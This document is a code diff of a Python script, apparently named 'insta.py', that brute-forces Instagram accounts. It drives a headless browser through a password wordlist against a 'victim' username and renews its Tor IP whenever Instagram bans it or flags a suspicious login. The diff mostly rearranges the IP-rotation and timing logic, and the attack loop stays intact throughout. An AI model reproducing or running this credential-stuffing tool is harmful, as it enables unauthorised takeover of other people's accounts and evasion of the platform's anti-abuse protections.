@@ -23,14 +23,12 @@ def banner():
 |                                             |
 |---------------------------------------------|
 -----------------------------------------------
-
     """)
 
 #USAGE
 def usage():
     print("""\n
     Usage: py insta.py [-u] [-pl]
-
     -u : The username of the victim
     -pl : The passwordlist to be used
     """)
@@ -69,9 +67,8 @@ def file_length(fname):
 #Function for getting a new IP, through TOR
 def renew_tor_ip():
     with Controller.from_port(port = 9051) as controller:
-        controller.authenticate()
+        controller.authenticate(password="accessdenied")
         controller.signal(Signal.NEWNYM)
-
 
 ###########  Setting up the driver  ###################
 
@@ -83,9 +80,7 @@ options.add_argument('--proxy-server=%s' % PROXY)
 options.add_argument('headless')
 options.add_argument('--log-level=3')
 #Setting up the chromedriver
-chrome_driver = "C:/webdrivers/chromedriver.exe"
 driver = webdriver.Chrome(options=options, executable_path=r'C:/webdrivers/chromedriver.exe') # <<<< EDIT this according to your directory
-
 
 #Making variables for incrementation, in the for loop
 a = 0
@@ -102,20 +97,7 @@ os.system(ops)
 # Main Loop
 while True:
     n += 1
-    #After every 5th try, change the IP, so instagram cannot ban it.
-    if n % 5 == 0:
-        driver.delete_all_cookies()
-        print("This IP has been used 5 times")
-        print("Requesting new IP")
-        driver.quit()
-        time.sleep(2)
-        #Setting up the driver
-        PROXY =  "socks5://127.0.0.1:9051"
-        renew_tor_ip()
-        options.add_argument("headless")
-        options.add_argument("'--log-level=3")
-        driver = webdriver.Chrome(options=options, executable_path=r'C:/webdrivers/chromedriver.exe') # <<<< EDIT this according to your directory
-        os.system(ops)
+    # Separating words in the wordlist
     f = open(str(passlist),"r")
     passw = f.readlines()[a:b]
     for p in passw:
@@ -127,9 +109,9 @@ while True:
         p = p.replace(",", "")
         print("\n")
     f.close()
+    #Incrementing variables (lines)
     a += 1
     b += 1
-
     #INFO
     os.system(ops)
     print("\n")
@@ -139,22 +121,12 @@ while True:
     print("Trying: ", p)
     print("Try: ", n)
 
-    #Getting the IP displayed
-    driver.get("http://icanhazip.com")
-    ips.append(driver.page_source)
-    time.sleep(1)
-    if ips.count(driver.page_source) > 5:
-        print("\n")
-        print("This IP was used more than 5 times")
-        print("Requesting new one")
-        time.sleep(5)
-        renew_tor_ip()
-
 ##########################  Getting Instagram, and filling in the input fields  ##########################
 
     #Navigating to Instagram login page
     driver.get('https://www.instagram.com/accounts/login/')
     time.sleep(5)
+
     #Finding the username and password boxes
     username = driver.find_element_by_name("username")
     password = driver.find_element_by_name("password")
@@ -196,8 +168,9 @@ while True:
                     print("\n")
                     print("Instagram has banned this IP")
                     print("Requesting new one")
+                    time.sleep(10)
                     renew_tor_ip()
-                    time.sleep(5)
+
 
                 elif "Suspicious Login Attempt" in driver.page_source:
                     print("\n")
@@ -236,8 +209,8 @@ while True:
             print("\n")
             print("Instagram has banned this IP")
             print("Requesting new one")
+            time.sleep(10)
             renew_tor_ip()
-            time.sleep(5)
 
 
     elif "Suspicious Login Attempt" in driver.page_source:
